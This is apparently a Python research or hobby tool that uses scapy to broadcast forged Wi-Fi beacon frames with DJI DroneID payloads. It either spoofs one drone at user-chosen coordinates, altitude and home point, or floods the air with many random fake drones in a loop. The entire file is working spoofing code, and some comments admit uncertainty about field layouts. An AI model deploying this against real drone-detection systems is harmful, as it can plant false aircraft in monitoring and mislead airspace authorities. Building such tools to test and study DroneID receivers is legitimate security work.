from Beacon import *
import struct
import sys, getopt, argparse
from scapy.sendrecv import sendp
import random, string
from math import floor


class DroneID:
    common_header = b'Xb\x13'
    telemetry_byte = b'\x10'
    flight_info_byte = b'\x11'
    random_source = string.ascii_uppercase + string.digits


    def __init__(self,*args, **kwargs):
        #print('args: ', args, ' kwargs: ', kwargs)

        if len(kwargs) == 1 : # If it receives only one parameter it means to randomize a drone
            self.random_drone(int(kwargs["index"]))
        
        else:
            
            self.ssid = kwargs['ssid'] if len(kwargs["ssid"]) > 0 else 'MAVIC-AIR-FAKE11'
            self.state = b'\x02M\x063\x1f' # Check the last byte what is exactly... SN length?
            self.sernum = ''.join(random.choice(DroneID.random_source) for i in range(16))  # Must be 16 characters... missing 2 ?
            
            # INPUT * 174533.0 little endian

            longitude = float(kwargs['lon']) if len(kwargs["lon"]) > 0  else self.random_location()[0] # Max -180 180 little endian signed
            self.longitude = self.loc2bytes(longitude)

            latitude = float(kwargs['lat']) if len(kwargs["lat"]) > 0  else self.random_location()[1]    # Max -90 90 little endian signed signed
            self.latitude = self.loc2bytes(latitude)

            self.altitude = int(kwargs['altitude']) if len(kwargs['altitude']) > 0  else struct.pack('<H', randomN(0,2**16-1))       # Max 16 bits little endian unsgined

            self.height = struct.pack('<H', (randomN(0,2**16-1)))  # Max 16 bits little endian unsgined

            self.v_north =  struct.pack('<h', randomN((-2**15),2**15-1))  # 2 Bytes   little endian signed
            self.v_east = struct.pack('<h', randomN((-2**15),2**15-1))  # 2 Bytes   little endian signed
            self.v_up =  struct.pack('<h', randomN((-2**15),2**15-1))  # 2 Bytes   little endian signed
            
            self.pitch = struct.pack('<h', randomN((-2**15),2**15-1))          # 2 Bytes   little endian   signed
            self.roll = struct.pack('<h', randomN((-2**15),2**15-1))           # 2 Bytes   little endian signed
            self.yaw = struct.pack('<h', randomN((-2**15),2**15-1))            # 2 Bytes   little endian signed           
            
            longitude_home = float(kwargs['home_lon']) if len(kwargs["home_lon"]) > 0  else self.random_location()[0]
            self.longitude_home = self.loc2bytes(longitude_home)
            
            latitude_home = float(kwargs['home_lat']) if len(kwargs["home_lat"]) > 0  else self.random_location()[1] 
            self.latitude_home = self.loc2bytes(latitude_home)

            self.prod_type = b'\x10'
            self.uuid = kwargs['uuid'] if len(kwargs['uuid']) > 0 else b'\x0f\x0f\x0f'
            self.uuid_len = len(self.uuid)

            [print(attribute, getattr(self, attribute)) for attribute in dir(self) if not attribute.startswith("__") and not callable(self)]

    '''
    Make all values of the drone random
    '''
    def random_drone(self, index=0):

        self.ssid = ''.join(["FAKE-", str(index + 1 )])
        self.mac_address = "60:60:1f:%02x:%02x:%02x" % (randomN(0, 255), randomN(0, 255), randomN(0, 255))     # it also accepts non DJI OUI mac address            
        # Is this really the state?
        self.state = b'\x02M\x063\x1f' # Check the last byte what is exactly... SN length?
        self.sernum = ''.join(random.choice(DroneID.random_source) for i in range(16))  # Must be 16 characters... missing 2 ?

        longitude, latitude = self.random_location()
        #print("Longitude {} \n Latitude {}".format(longitude,latitude))
        self.longitude = self.loc2bytes(longitude)
        self.latitude = self.loc2bytes(latitude)
        
        longitude_home, latitude_home = self.random_location() 
        #print("Longitude HOME {} \n Latitude HOME {}".format(longitude_home,latitude_home))
        self.longitude_home = self.loc2bytes(longitude_home)
        self.latitude_home = self.loc2bytes(latitude_home)

        #TODOOOO
        # ADD PILOT LOCATION

        self.altitude = struct.pack('<H', (randomN(0,2**16-1)))     # Max 32 bits little endian
        self.height = struct.pack('<H', (randomN(0,2**16-1))) 
        self.v_north = struct.pack('<h', randomN((-2**15),2**15-1))  # 2 Bytes   little endian signed
        self.v_east = struct.pack('<h', randomN((-2**15),2**15-1))  # 2 Bytes   little endian signed
        self.v_up =  struct.pack('<h', randomN((-2**15),2**15-1))  # 2 Bytes   little endian signed
        self.pitch = struct.pack('<h', randomN((-2**15),2**15-1))          # 2 Bytes   little endian   signed
        self.roll = struct.pack('<h', randomN((-2**15),2**15-1))           # 2 Bytes   little endian signed
        self.yaw = struct.pack('<h', randomN((-2**15),2**15-1))            # 2 Bytes   little endian signed
        self.prod_type = b'\x10' # Make it random
        self.uuid = ''.join(random.choice(string.digits) for i in range(7))
        self.uuid_len = len(self.uuid)
    
    '''
    Convert a droneID parameter into byte representation if it's not already converted
    '''
    def attribute2byte(self, attribute, endiannes='<'):
        att_type = type(attribute)
        if att_type == str:
            p= str.encode(attribute)
            #print("Attribute {} {}: {}".format(attribute, att_type, p))
            return p

        elif att_type == int:
            p= struct.pack(''.join([endiannes,'h']), attribute)
            #print("Attribute {} {}: {}".format(attribute,att_type, p))
            return p
        elif att_type == float:

            p = struct.pack(''.join([endiannes,'f']), attribute)
            #print("Attribute {} {}: {}".format(attribute, att_type,p))
            return p
        else:
            #print("Attribute {}: {}".format(attribute,att_type))
            return attribute
    
    '''
    Builds the payload containing the DroneID  telemetry info
    '''
    def build_telemetry(self):

        drone2bytes = b''.join([DroneID.common_header,
        DroneID.telemetry_byte,
        self.state,
        self.attribute2byte(self.sernum),
        self.longitude,
        self.latitude,
        self.altitude,
        self.height,
        self.v_north,
        self.v_east,
        self.v_up,
        self.pitch,
        self.roll,
        self.yaw,
        self.longitude_home,
        self.latitude_home, #  ToDo include pilotlocation
        self.prod_type,
        self.uuid_len,
        self.uuid       
        ])
        drone2bytes = b''.join([drone2bytes,b'\x00'*(91 - len(drone2bytes))]) # some padding

        #print(drone2bytes)
        return drone2bytes

    '''
    Builds the payload containing the DroneID flight info
    '''
    def build_finfo(self, identification="identif", flight_info="info"):

        finfo_bytes = b''.join([DroneID.common_header,
        DroneID.flight_info_byte,  # 11
        self.attribute2byte(self.sernum),
        self.attribute2byte(str(len(identification))),  # ToDo-> max 0x7f, minimum of 10 bytes
        self.attribute2byte(identification),
        self.attribute2byte(str(len(flight_info))),
        self.attribute2byte(flight_info)])
        finfo_bytes = b''.join([finfo_bytes,b'\x00'*(147 - len(finfo_bytes))])  # some padding ...
        
        return finfo_bytes


    def random_location(self):
        return random.uniform(-180,180), random.uniform(-90, 90)

    def loc2bytes(self, location):
        if location < 0:
            a = struct.pack('<i', floor(location * 174533))
        else:
            a = struct.pack('<i', floor(location * 174533))
        return a

'''
Random number between 'a' and 'b'
If number is negative we send the binary complement
'''
def randomN(a,b):
    r = random.randint(a,b)
    if r < 0:
        r = ~r
    return r

'''
   Assemble the DJI payload to a 802.11 beacon packet
'''
def create_packet(beacon_base, payload):
    packet = beacon_base.get_beacon().copy()  

    # Not necessary but it appears in different DJI models
    vendor_microsoft = Dot11EltVendorSpecific(ID=221, len= 24, oui= 0x0050f2,info = b'\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00')

    # DJI Payload
    tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(payload) + 3,oui=0x263712, info = payload)
    packet = packet / vendor_microsoft / tag_vendor_dji 

    return packet


'''
Function to spoof a single Drone
If it does not get any input, the parameters are set by default
'''
def one_drone():
    print("Press intro to set default")
    ssid = str(input("SSID: "))
    lat = (input("Latitude: "))
    lon = (input("Longitude: "))
    altitude = (input("Altitude (Max 65535): "))
    home_lat = (input("Home Latitude: "))
    home_long = (input("Home Longitude: "))
    uuid = str(input("UUID (16 chars): "))

    # Define which parameters we can randomize ... it doesn't make sense to let the user set Yaw for example.

    #mac_address = str(input("Mac address:")) # ToDo check if it works with random... or it needs to start with DJI prefix
    #sn = str(input("Serial number (16 chars): " ))  
    #height = (input("Height: "))
    #v_north = (input("Velocity")) # That will just be to north.. need to implement other directon
    #pitch = (input("Pitch ([-180:180]): "))
    #roll = (input("Roll ([-180:180]): "))
    #yaw = (input("Yaw ([-180:180]): "))
    
    # Set drone's parameters
    drone = DroneID(ssid=ssid,lat=lat, lon=lon, altitude=altitude, home_lat=home_lat, home_lon=home_long, uuid=uuid)

    # Create base beacon packet associated to that drone
    beacon_base = Beacon("", ssid ).get_beacon()
    
    # Create the payload necessary for spoofing it and assemble it into a packet
    telemetry_payload = drone.build_telemetry()
    telemetry_packet = create_packet(beacon_base, telemetry_payload)

    finfo_payload = drone.build_finfo() # ToDo Get user input to set flight info
    finfo_packet = create_packet(beacon_base, finfo_payload)

    # Build a list of packets to be sent
    packet_list = []
    packet_list.append(telemetry_packet)
    packet_list.append(finfo_packet)

    sendp(packet_list, iface = interface, loop = 1, inter = 0.1)



def random_spoof(n):
    # ToDo Check if I need to copy the packet, or otherwise it reuses the same
     # Create base beacon packet associated to that drone
    beacon_base = Beacon("", "" ).get_beacon()

    packet_list = [] # set of packets to be sent
    for i in range( int(n)):
        drone = DroneID(index=i)

        print("===========================")
        print("Setting Drone {}".format(i))
        print("===========================")
        beacon_base.set_ssid(drone.ssid)
        beacon_base.set_addr2(drone.mac_address)
        print("SSID: {}".format(drone.ssid))
        print("MAC Address {}".format(drone.mac_address))


        payload = drone.build_telemetry()

        telemetry_packet = create_packet( beacon_base, payload)
        #telemetry_packet.show()
        packet_list.append(telemetry_packet)
    print("===========================")

    sendp(packet_list, iface = interface, loop = 1, inter = 0.5)


        

'''
Main part
Arguments indicate whether to spoof a single specific drone or N random drones
'''

parser = argparse.ArgumentParser()

parser.add_argument("-i", "--interface")
parser.add_argument("-r", "--random", help="Spoof randomly N drones")
parser.add_argument("-a", "--area", help="Spoof the drone in a limited area")


args = parser.parse_args()

if not args.interface:
    raise SystemExit(f"Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones>\n \
-r N    Spoof N random drones. 2 by default")

else:
    interface = args.interface
    
    if args.random : # Consider fail when you pass 0 drones... ToDo
        
        n_random = args.random
        print("Gonna spoof {} drones randomly".format(n_random))
        random_spoof(n_random)
    else: 
        one_drone()